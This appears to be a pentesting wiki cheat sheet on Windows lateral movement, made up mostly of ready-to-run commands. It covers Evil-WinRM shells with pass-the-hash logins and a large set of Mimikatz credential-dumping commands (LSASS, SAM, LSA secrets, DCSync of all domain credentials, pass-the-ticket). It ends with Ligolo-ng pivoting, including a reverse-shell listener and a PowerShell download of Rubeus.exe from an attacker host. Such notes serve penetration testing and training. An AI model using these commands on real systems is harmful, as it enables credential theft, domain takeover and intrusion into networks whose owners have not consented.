---
layout: wiki
title: Lateral Movement
cate1: Internals
cate2: Step 3
description: Lateral Movement
keywords: Internals
---

# Lateral Movement

## Smbexec
**[Smbexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec)**

## WinRM 
**[Evil-WinRM - ultimate WinRM shell for hacking/pentesting](https://github.com/Hackplayers/evil-winrm)**

```
gem install evil-winrm
evil-winrm -i <IP> -u <username> -p <password>
evil-winrm -i <IP> -u <username> -H <ntlm hash>
evil-winrm -i <IP> -u <username> -k

## Run Powershell Commands
whoami
ipconfig
Get-Process

## Upload and Download Files
upload /local/path/to/file /remote/path
download /remote/path/to/file /local/path

## Run Powershell Scripts
upload /local/path/to/script.ps1 /remote/path/script.ps1
powershell -File /remote/path/script.ps1
```

## Mimikatz
**[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**

```
#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#Dump old passwords and NTLM hashes of a user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

**Additional Resources**
  - [Mimikatz Post Exploitation Basics](https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87)
  - [Mimikatz Guide Reference](https://adsecurity.org/?page_id=1821)

## Network Pivoting via Ligolo-ng
**[Network Pivoting - Ligolo-ng](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)**

```
./agent -connect 10.10.14.5:443 -ignore-cert
sudo ./proxy -selfcert -laddr 0.0.0.0:443 -v
session
start
sudo ip route add 192.168.110.0/24 dev ligolo

listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 (open port on DMZ machine for reverse shell)

powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.exe' -OutFile 'Rubeus.exe'"
```

**Additional Resources**
  - [Ligolo Guide for pivoting](https://systemweakness.com/pivoting-for-newbies-with-ligolo-ng-82f13040aa39)
  - [Advanced pivoting guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
